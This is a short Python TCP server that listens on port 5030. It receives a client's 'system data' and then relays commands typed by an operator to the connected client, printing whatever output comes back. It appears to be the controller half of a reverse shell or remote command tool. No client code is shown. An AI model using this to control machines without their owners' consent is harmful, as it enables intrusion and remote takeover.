import socket
import sys
import threading

host="0.0.0.0"
port=5030






def usage():
    pass

def encode_data(data: str) -> bytes:return data.encode('utf-8')
def decode_data(data: bytes) -> str:return data.decode('utf-8')


def send_command(client_socket, command:str):
    try:
        client_socket.send(encode_data(command))
    except Exception as error:
        print('ERROR: sending command failed')
    

def handle_connection(client_socket):
    try:
        system_data = client_socket.recv(4096)
        print(f'received {decode_data(system_data)}')

        while True:
            command = str( input("input:") ) 
            command = command.rstrip()
            if len( command) and command != 'exit':
                client_socket.send( encode_data(command))
                response = client_socket.recv(4096)
                print(f'output: {decode_data(response)}')
            elif command =='exit':
                client_socket.close()
                break
                
            
    except Exception as error:
        print(f"ERROR: {str(error)}")
        client_socket.close()

def main():
    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    server.bind( (host,port) )
    server.listen(5)

    print(f"server is listening on {host}:{port}")

    try:
        while True:
            try:
                client, addr = server.accept()
                print(f"received connection from {str(addr)}")
                server_thread = threading.Thread( target= handle_connection , args=(client,))  
                server_thread.start()

            except KeyboardInterrupt as error:
                print("---closing down server---")
                break
            except Exception as error:
                print(f'ERROR: {str(error)}')
                break
    finally:
        server.close()
        print('server closed')
        sys.exit()
    
        
if __name__=="__main__":
    main()